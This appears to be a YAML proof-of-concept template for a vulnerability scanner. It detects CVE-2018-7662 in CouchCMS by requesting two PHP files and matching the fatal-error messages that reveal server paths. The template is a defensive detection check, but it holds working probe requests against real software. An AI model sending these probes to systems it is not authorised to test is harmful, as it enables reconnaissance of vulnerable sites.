detail:
  author: we1x4n(https://we1x4n.github.io/)
  links:
  - https://github.com/CouchCMS/CouchCMS/issues/46
expression: r0() && r1()
manual: true
name: poc-yaml-couchcms-cve-2018-7662
rules:
  r0:
    expression: 'response.status == 200 && response.body.bcontains(b"mysql2i.func.php
      on line 10") && response.body.bcontains(b"Fatal error: Cannot redeclare mysql_affected_rows()
      in")'
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /includes/mysql2i/mysql2i.func.php
  r1:
    expression: 'response.status == 200 && response.body.bcontains(b"phpmailer.php
      on line 10") && response.body.bcontains(b"Fatal error: Call to a menber function
      add_event_listener() on a non-object in")'
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /addons/phpmailer/phpmailer.php
transport: http
